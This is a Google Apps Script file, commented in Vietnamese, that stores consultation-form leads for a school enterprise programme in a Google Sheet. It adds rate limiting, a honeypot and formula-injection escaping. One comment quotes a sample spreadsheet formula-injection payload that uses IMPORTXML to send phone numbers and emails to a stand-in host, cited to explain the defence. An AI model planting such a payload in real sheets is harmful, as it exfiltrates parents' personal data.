/**
 * School Enterprise Challenge Việt Nam — Form tư vấn → Google Sheet
 * Google Apps Script (Web App). Nhận POST từ js/main.js, ghi vào Sheet. KHÔNG gửi email.
 *
 * Bản 17/09/2026 — tối ưu tốc độ + vá bảo mật (chặn formula injection, giới hạn tốc độ toàn cục, trần số dòng):
 *   - Bỏ email báo (MailApp mất 1–3s mỗi lần, là bước tốn nhất).
 *   - Ghi Sheet đúng 1 lượt gọi (setValues) thay vì appendRow + getLastRow + setNumberFormat + setValue (4 lượt).
 *     Cột C đã định dạng văn bản (@) từ setup() nên SĐT giữ số 0 đầu mà không cần sửa từng ô.
 *   - Giữ chống trùng (CacheService) và khoá ghi (LockService) — cả hai gần như không tốn thời gian.
 *   Phần còn lại chậm là do Google khởi động script (không kiểm soát được); phía web đã có timeout 15s.
 *
 * CÀI ĐẶT:
 * 1. Tạo Google Sheet (ví dụ "SEC Vietnam - Leads").
 * 2. Extensions → Apps Script → xoá code mẫu, dán toàn bộ file này.
 * 3. TOKEN bên dưới phải TRÙNG với TOKEN trong js/main.js (mục FORM_CONFIG).
 * 4. Chạy hàm setup() một lần (chọn setup ở thanh trên → Run) để tạo tiêu đề cột + định dạng cột.
 * 5. Deploy → New deployment → Web app: Execute as: Me | Who has access: Anyone → copy URL .../exec vào SCRIPT_URL.
 * 6. Sau này sửa code phải Deploy lại: Manage deployments → Edit → Version: New version (URL giữ nguyên).
 */

// ====== CẤU HÌNH ======
const TOKEN = 'token123@x3312ccwdze';   // trùng với js/main.js — LƯU Ý: token nằm trong JS public, chỉ chặn bot vớ vẩn, không phải bảo mật
const SHEET = 'Leads';                   // tên tab trong Sheet
const THROTTLE_SECONDS = 60;             // cùng 1 SĐT gửi lại trong 60s → bỏ qua, vẫn trả ok

// Giới hạn tốc độ TOÀN CỤC (17/09/2026 — rà bảo mật): Apps Script không cho biết IP người gửi nên không chặn theo IP được,
// chỉ chặn tổng. Mục đích: kẻ xấu bơm hàng nghìn dòng sẽ (a) làm đầy Sheet, (b) đốt hết quota chạy script/ngày → form chết
// với phụ huynh thật. Form thật hiếm khi quá vài đơn/phút.
const MAX_PER_MINUTE = 8;
const MAX_PER_HOUR   = 60;
const MAX_ROWS       = 5000;             // Sheet quá số dòng này → ngừng nhận, báo gọi hotline

const AUDIENCE_LABEL = {
  school: 'Nhà trường / Giáo viên',
  parent: 'Phụ huynh / Học sinh'
};

const HEADER = ['Thời gian', 'Họ tên', 'Điện thoại / Zalo', 'Email', 'Bạn là',
                'Trường / Tổ chức', 'Vai trò', 'Nội dung cần tư vấn', 'Đồng ý điều khoản'];

// ====== NHẬN FORM ======
function doPost(e) {
  try {
    if (!e || !e.postData || !e.postData.contents) {
      return json({ result: 'error', message: 'Không có dữ liệu' });
    }
    const data = JSON.parse(e.postData.contents);

    // 1. Token sai → từ chối
    if (!data.token || data.token !== TOKEN) {
      return json({ result: 'error', message: 'Yêu cầu không hợp lệ' });
    }

    // 2. Honeypot: ô "website" ẩn, người thật không điền; bot điền → giả vờ ok
    if (data.website) return json({ result: 'ok' });

    // 3. Làm sạch + validate
    const lead = {
      name:     clean(data.name, 120),
      phone:    clean(data.phone, 30),
      email:    clean(data.email, 120),
      audience: AUDIENCE_LABEL[data.audience] || clean(data.audience, 40),
      org:      clean(data.org, 160),
      role:     clean(data.role, 80),
      message:  clean(data.message, 2000),
      consent:  data.consent === 'yes' ? 'Đồng ý' : ''
    };
    if (!lead.name || !lead.phone) {
      return json({ result: 'error', message: 'Vui lòng nhập họ tên và số điện thoại' });
    }
    if (!/^[0-9+().\s-]{8,20}$/.test(lead.phone)) {
      return json({ result: 'error', message: 'Số điện thoại không hợp lệ' });
    }
    if (lead.email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(lead.email)) {
      return json({ result: 'error', message: 'Email không hợp lệ' });
    }

    // 4. Chống gửi lặp: cùng SĐT trong THROTTLE_SECONDS → im lặng bỏ qua (web bấm gửi lại sau timeout vẫn an toàn)
    const cache = CacheService.getScriptCache();
    const key = 'lead:' + lead.phone.replace(/\D/g, '');
    if (cache.get(key)) return json({ result: 'ok', duplicate: true });

    // 4b. Giới hạn tốc độ toàn cục (đếm trong cache, hết hạn tự reset)
    if (overLimit(cache, 'rl:min', 60, MAX_PER_MINUTE) || overLimit(cache, 'rl:hour', 3600, MAX_PER_HOUR)) {
      console.warn('Rate limit: từ chối ' + lead.phone);
      return json({ result: 'error', message: 'Hệ thống đang nhận quá nhiều yêu cầu, vui lòng thử lại sau ít phút hoặc gọi hotline 0906 616 212' });
    }
    cache.put(key, '1', THROTTLE_SECONDS);

    // 5. Ghi Sheet — 1 lượt gọi duy nhất. Khoá để 2 request cùng lúc không ghi đè cùng dòng.
    const row = [
      new Date(),
      lead.name, lead.phone, lead.email, lead.audience,
      lead.org, lead.role, lead.message,
      lead.consent   // bằng chứng người dùng đã tick đồng ý điều khoản
    ];
    const lock = LockService.getScriptLock();
    lock.waitLock(5000);
    try {
      const sheet = getSheet();
      const next = sheet.getLastRow() + 1;
      if (next > MAX_ROWS) {
        return json({ result: 'error', message: 'Hệ thống tạm ngừng nhận đăng ký, vui lòng gọi hotline 0906 616 212' });
      }
      // Ép ô thành văn bản TRƯỚC khi ghi: dù còn sót ký tự '=' cũng không bị diễn giải thành công thức
      const range = sheet.getRange(next, 1, 1, row.length);
      sheet.getRange(next, 2, 1, row.length - 1).setNumberFormat('@');
      range.setValues([row]);
    } finally {
      lock.releaseLock();
    }

    return json({ result: 'ok' });
  } catch (err) {
    console.error(err);
    return json({ result: 'error', message: 'Hệ thống đang bận, vui lòng thử lại' });
  }
}

// Mở trình duyệt vào URL /exec sẽ thấy dòng này → biết deploy đã sống
function doGet() {
  return ContentService.createTextOutput('SEC Vietnam lead endpoint OK');
}

// ====== TIỆN ÍCH ======
function getSheet() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sheet = ss.getSheetByName(SHEET);
  if (!sheet) {
    sheet = ss.insertSheet(SHEET);
    writeHeader(sheet);
  }
  return sheet;
}

function writeHeader(sheet) {
  sheet.getRange(1, 1, 1, HEADER.length).setValues([HEADER]).setFontWeight('bold');
  sheet.setFrozenRows(1);
  sheet.getRange('A:A').setNumberFormat('dd/mm/yyyy hh:mm');
  sheet.getRange('B:I').setNumberFormat('@');   // B..I văn bản thuần: SĐT giữ số 0 đầu + chặn công thức (doPost cũng ép lại từng dòng)
  sheet.setColumnWidths(1, 1, 130);
  sheet.setColumnWidths(2, 2, 160);
  sheet.setColumnWidths(8, 1, 360);
}

// Làm sạch 1 ô: bỏ ký tự điều khiển (giữ xuống dòng) + CHẶN FORMULA INJECTION.
// Sheets coi chuỗi bắt đầu bằng '=' là công thức → kẻ xấu gửi "=IMPORTXML(\"https://x/?d=\"&A2:I999)" là rút sạch
// SĐT/email phụ huynh ra ngoài. Excel/LibreOffice khi mở CSV còn tính cả '+', '-', '@', tab, CR ở đầu ô.
// Cách xử lý: ô nào bắt đầu bằng mấy ký tự đó thì chèn 1 dấu nháy đơn ' phía trước (Sheets/Excel hiểu là "văn bản").
function clean(v, max) {
  if (v === undefined || v === null) return '';
  let s = String(v).replace(/[\x00-\x09\x0B-\x1F\x7F]/g, ' ').trim().slice(0, max);
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  return s;
}

// Đếm số request trong khung thời gian bằng cache (không cần Sheet/Properties, không tốn thời gian)
function overLimit(cache, key, seconds, max) {
  const n = Number(cache.get(key) || 0) + 1;
  cache.put(key, String(n), seconds);
  return n > max;
}

function json(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}

// ====== CHẠY 1 LẦN SAU KHI DÁN CODE (chạy lại vô hại — chỉ tạo tab/tiêu đề khi thiếu, luôn ép lại định dạng cột C) ======
function setup() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sheet = ss.getSheetByName(SHEET);
  if (!sheet) {
    const first = ss.getSheets()[0];
    // Sheet mới toanh thì đổi tên tab đầu tiên cho gọn, không tạo tab thừa
    if (ss.getSheets().length === 1 && first.getLastRow() === 0) {
      first.setName(SHEET);
      sheet = first;
    } else {
      sheet = ss.insertSheet(SHEET);
    }
  }
  if (sheet.getLastRow() === 0) writeHeader(sheet);
  sheet.getRange('B:I').setNumberFormat('@');   // cột B..I văn bản thuần: SĐT giữ số 0 đầu, và không ô nào chạy được công thức
  console.log('OK: tab "' + SHEET + '" đã sẵn sàng. Giờ Deploy → Manage deployments → New version.');
}

// Gửi thử 1 dòng mà không cần form (Run hàm này trong editor để kiểm tra, rồi xoá dòng test trong Sheet)
function testPost() {
  const fake = { postData: { contents: JSON.stringify({
    token: TOKEN, name: 'Test Nguyễn', phone: '0900000000', email: 'test@example.com',
    audience: 'school', org: 'Trường Test', role: 'Giáo viên', message: 'Dòng test từ Apps Script', consent: 'yes'
  }) } };
  const t0 = Date.now();
  console.log(doPost(fake).getContent(), '— mất ' + (Date.now() - t0) + ' ms');
}
